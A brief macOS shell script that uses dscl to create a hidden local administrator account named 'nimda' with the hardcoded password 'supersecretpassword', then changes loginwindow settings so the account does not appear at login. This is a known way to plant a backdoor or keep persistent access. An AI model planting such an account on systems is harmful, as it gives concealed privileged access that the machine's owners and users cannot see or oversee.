#!/bin/sh

mkdir /private/var/nimda

dscl . create /Users/nimda
dscl . create /Users/nimda RealName “Secret Admin Account"
dscl . passwd /Users/nimda supersecretpassword
dscl . create /Users/nimda UniqueID 499
dscl . create /Users/nimda PrimaryGroupID 80
dscl . create /Users/nimda UserShell /bin/bash
dscl . create /Users/nimda NFSHomeDirectory /private/var/nimda
dscl . append /Groups/admin GroupMembership nimda

chown -R nimda /private/var/nimda

sudo defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool TRUE

sudo defaults write /Library/Preferences/com.apple.loginwindow HiddenUsersList -array nimda

sudo defaults write /Library/Preferences/com.apple.loginwindow SHOWOTHERUSERS_MANAGED -bool FALSE

sudo createhomedir -c -u nimda

